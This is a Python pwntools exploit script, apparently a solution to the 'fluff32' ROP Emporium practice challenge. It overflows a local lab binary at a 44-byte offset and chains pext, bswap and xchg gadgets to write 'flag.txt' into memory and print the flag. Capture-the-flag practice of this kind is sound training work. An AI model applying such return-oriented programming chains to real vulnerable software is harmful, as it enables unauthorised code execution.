from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./fluff32', checksec=False)
p = process()

# How many bytes to EIP?
offset = 44

# ROP
rop = ROP(elf)  # Load rop so we can access gadgets

# Address of .data section (size=8 bytes)
data_section_address = elf.symbols.data_start
info("%#x data_section_address", data_section_address)

# Need to get our string into ebp ready for the next gadget which moves ebp to eax [pext mask]
pop_ebp = rop.find_gadget(["pop ebp", "ret"])[0]
info("%#x pop ebp; ret;", pop_ebp)

# Mov ebp to eax
# Mov 0xb0bababa to ebx
# pext edx, ebx, eax - (we control the eax [mask])
# Mov 0xdeadbeef to eax (who cares?)
long_pext_gadget = elf.symbols.questionableGadgets  # Note: pwntools hides "non-trivial gadgets", docs advise using ropper/ROPGadget to list them all
info("%#x mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;", long_pext_gadget)

# Pop ecx and bswap (swap between big/little endian) [.data address]
bswap_ecx = elf.symbols.questionableGadgets + 21  # pop ecx; bswap ecx; ret;
info("%#x pop ecx; bswap ecx; ret;", bswap_ecx)

# Exchange a byte in dl (LSB of edx) with byte in memory location pointed to by ecx [write to .data]
xchg_ecx_dl = elf.symbols.questionableGadgets + 18  # xchg byte ptr [ecx], dl; ret;
info("%#x xchg byte ptr [ecx], dl; ret;", xchg_ecx_dl)

string_to_write = "flag.txt"  # We don't actually use this, just here for reference
# We'll be using this mask, which we calculated in find_mask.py
full_mask = [0xb4b, 0x2dd, 0x1d46, 0xb5a, 0x1db, 0xacd, 0x1ac5, 0xacd]

# Loop through each mask, using index as data section offset
for data_section_offset, mask in enumerate(full_mask):
    # Pop mask to ebp
    # Perform pext (masking operation) using 0xb0bababa (hardcoded) and our mask byte, place result in edx (dl)
    # Pop data section address offset to ecx (also performs bswap to swap endianness, hence us setting to big first)
    # Exchange the byte in edx (dl - result of masking) with the byte pointed to by ecx (our dataset offset)
    rop.raw([pop_ebp, mask, long_pext_gadget, bswap_ecx, pack(data_section_address + data_section_offset, endian='big'), xchg_ecx_dl])

# Call print file function with data section address as param
rop.print_file(data_section_address)

# Chain it together (get the raw ROP bytes)
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

# Build payload (inject rop_chain at offset)
payload = flat({
    offset: rop_chain
})

# Save payload to file
write("payload", payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
